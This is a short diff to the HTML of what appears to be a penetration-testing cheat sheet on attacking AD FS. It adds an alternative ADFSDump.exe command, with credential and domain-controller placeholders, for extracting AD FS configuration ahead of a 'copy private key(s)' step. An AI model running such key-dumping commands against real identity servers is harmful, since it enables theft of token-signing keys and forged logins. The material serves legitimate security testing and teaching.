@@ -392,6 +392,8 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">@RuleName = &#34;LdapClaims&#34;
 </span></span></span><span class="line"><span class="cl"><span class="go">c:[Type == &#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname&#34;, Issuer == &#34;AD AUTHORITY&#34;]
 </span></span></span><span class="line"><span class="cl"><span class="go"> =&gt; issue(store = &#34;Active Directory&#34;, types = (&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&#34;, &#34;http://schemas.xmlsoap.org/claims/CommonName&#34;), query = &#34;;userPrincipalName,sAMAccountName;{0}&#34;, param = c.Value);
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Alternative <span class="k">if</span> error
+</span></span><span class="line"><span class="cl"><span class="go">.\ADFSDump.exe /user:&lt;USER&gt; /password:&lt;PASSWORD&gt; /domain:&lt;DOMAIN&gt; /server:&lt;DC_IP&gt;
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/mandiant/ADFSDump">ADFSDump</a></em></small></p>
 <h4 id="2-convert-to-binary-blob">2. Convert to binary blob</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy private key<span class="o">(</span>s<span class="o">)</span>
